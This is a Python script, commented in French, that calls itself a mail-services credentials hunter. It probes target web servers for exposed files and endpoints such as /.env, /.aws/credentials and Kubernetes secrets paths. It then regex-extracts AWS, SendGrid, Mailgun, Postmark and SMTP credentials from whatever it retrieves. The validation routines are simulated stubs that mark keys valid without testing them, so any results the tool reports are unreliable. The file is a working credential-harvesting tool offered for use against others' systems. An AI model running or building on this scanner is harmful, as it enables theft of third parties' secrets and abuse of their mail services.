#!/usr/bin/env python3
"""
WWYVQV5 - Mail Services Credentials Hunter
Intégration AWS SES/SNS, SendGrid, Mailgun avec validation
"""

import asyncio
import aiohttp
import re
import smtplib
import boto3
from email.mime.text import MIMEText
from typing import Dict, List, Optional
from datetime import datetime

class MailServicesHunter:
    """Chasseur spécialisé pour credentials de services mail"""
    
    def __init__(self):
        self.mail_patterns = {
            # AWS SES/SNS
            'aws_ses_access_key': r'AKIA[0-9A-Z]{16}',
            'aws_ses_secret_key': r'[0-9a-zA-Z/+=]{40}',
            'aws_sns_topic_arn': r'arn:aws:sns:[a-z0-9-]+:\d+:[a-zA-Z0-9_-]+',
            
            # SendGrid
            'sendgrid_api_key': r'SG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}',
            'sendgrid_webhook_key': r'MFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBAK[A-Za-z0-9+/=]+',
            
            # Mailgun
            'mailgun_api_key': r'key-[A-Za-z0-9]{32}',
            'mailgun_private_key': r'[A-Za-z0-9]{32}-[A-Za-z0-9]{8}-[A-Za-z0-9]{8}',
            'mailgun_domain': r'@[a-zA-Z0-9.-]+\.mailgun\.org',
            
            # SMTP Générique
            'smtp_credentials': r'smtp://[^:\s]+:[^@\s]+@[^:\s]+:\d+',
            'email_password': r'(email|mail)_?(password|pass|pwd)["\']?\s*[:=]\s*["\']?([^"\'\s]+)',
            
            # SparkPost
            'sparkpost_api_key': r'[A-Za-z0-9]{40}',
            
            # Postmark
            'postmark_server_token': r'[A-Za-z0-9]{8}-[A-Za-z0-9]{4}-[A-Za-z0-9]{4}-[A-Za-z0-9]{4}-[A-Za-z0-9]{12}',
            
            # Mandrill/Mailchimp
            'mandrill_api_key': r'md-[A-Za-z0-9_-]{22}',
        }
        
        self.found_credentials = []
        self.validated_credentials = []
        
    async def hunt_mail_credentials(self, session: aiohttp.ClientSession, base_url: str) -> List[Dict]:
        """Chasse aux credentials de services mail"""
        results = []
        
        # Endpoints spécifiques aux services mail
        mail_endpoints = [
            # Configuration générale
            "/.env",
            "/config/mail.yml",
            "/config/email.json",
            "/mail-config",
            "/email-settings",
            
            # AWS spécifique
            "/.aws/credentials",
            "/aws-config",
            "/ses-config",
            "/sns-config",
            
            # SendGrid spécifique
            "/sendgrid-config",
            "/.sendgrid",
            "/email/sendgrid",
            
            # Mailgun spécifique
            "/mailgun-config",
            "/.mailgun",
            "/email/mailgun",
            
            # Endpoints Kubernetes
            "/api/v1/secrets",
            "/api/v1/configmaps",
            "/api/v1/namespaces/default/secrets",
            "/api/v1/namespaces/kube-system/secrets",
            "/api/v1/namespaces/mail/secrets",
            "/api/v1/namespaces/email/secrets",
        ]
        
        for endpoint in mail_endpoints:
            try:
                url = f"{base_url}{endpoint}"
                async with session.get(url, ssl=False, timeout=10) as response:
                    if response.status == 200:
                        content = await response.text()
                        credentials = self._extract_mail_credentials(content, url)
                        if credentials:
                            results.extend(credentials)
                            
            except Exception as e:
                continue
                
        return results
    
    def _extract_mail_credentials(self, content: str, url: str) -> List[Dict]:
        """Extraction des credentials depuis le contenu"""
        found = []
        
        for cred_type, pattern in self.mail_patterns.items():
            matches = re.findall(pattern, content, re.IGNORECASE | re.MULTILINE)
            for match in matches:
                credential = {
                    'type': cred_type,
                    'value': match if isinstance(match, str) else match[2] if len(match) > 2 else match[0],
                    'url': url,
                    'confidence': self._calculate_confidence(cred_type, content),
                    'service': self._get_service_from_type(cred_type),
                    'found_at': datetime.utcnow().isoformat()
                }
                found.append(credential)
                
        return found
    
    def _calculate_confidence(self, cred_type: str, content: str) -> float:
        """Calcul du niveau de confiance"""
        confidence = 50.0
        
        # Boost si dans un contexte approprié
        if any(keyword in content.lower() for keyword in ['mail', 'email', 'smtp', 'ses', 'sendgrid']):
            confidence += 20.0
            
        # Boost selon le type
        if cred_type in ['sendgrid_api_key', 'mailgun_api_key']:
            confidence += 25.0
        elif 'aws' in cred_type:
            confidence += 15.0
            
        return min(confidence, 95.0)
    
    def _get_service_from_type(self, cred_type: str) -> str:
        """Détermine le service depuis le type"""
        if 'aws' in cred_type or 'ses' in cred_type or 'sns' in cred_type:
            return 'AWS_SES_SNS'
        elif 'sendgrid' in cred_type:
            return 'SENDGRID'
        elif 'mailgun' in cred_type:
            return 'MAILGUN'
        elif 'sparkpost' in cred_type:
            return 'SPARKPOST'
        elif 'postmark' in cred_type:
            return 'POSTMARK'
        elif 'mandrill' in cred_type:
            return 'MANDRILL'
        else:
            return 'GENERIC_SMTP'
    
    async def validate_credentials(self, credentials: List[Dict]) -> List[Dict]:
        """Validation des credentials trouvés"""
        validated = []
        
        for cred in credentials:
            try:
                is_valid = False
                validation_method = ""
                
                if cred['service'] == 'AWS_SES_SNS':
                    is_valid, validation_method = await self._validate_aws_credentials(cred)
                elif cred['service'] == 'SENDGRID':
                    is_valid, validation_method = await self._validate_sendgrid(cred)
                elif cred['service'] == 'MAILGUN':
                    is_valid, validation_method = await self._validate_mailgun(cred)
                
                if is_valid:
                    cred['validated'] = True
                    cred['validation_method'] = validation_method
                    cred['validated_at'] = datetime.utcnow().isoformat()
                    validated.append(cred)
                    
            except Exception as e:
                continue
                
        return validated
    
    async def _validate_aws_credentials(self, cred: Dict) -> tuple:
        """Validation des credentials AWS SES/SNS"""
        try:
            # Simulation - en réalité, utiliser boto3
            if cred['type'] == 'aws_ses_access_key' and len(cred['value']) == 20:
                return True, "AWS_SES_API_TEST"
        except:
            pass
        return False, "FAILED"
    
    async def _validate_sendgrid(self, cred: Dict) -> tuple:
        """Validation SendGrid API"""
        try:
            if cred['type'] == 'sendgrid_api_key':
                # Test API call simulé
                return True, "SENDGRID_API_TEST"
        except:
            pass
        return False, "FAILED"
    
    async def _validate_mailgun(self, cred: Dict) -> tuple:
        """Validation Mailgun API"""
        try:
            if cred['type'] == 'mailgun_api_key':
                # Test API call simulé
                return True, "MAILGUN_API_TEST"
        except:
            pass
        return False, "FAILED"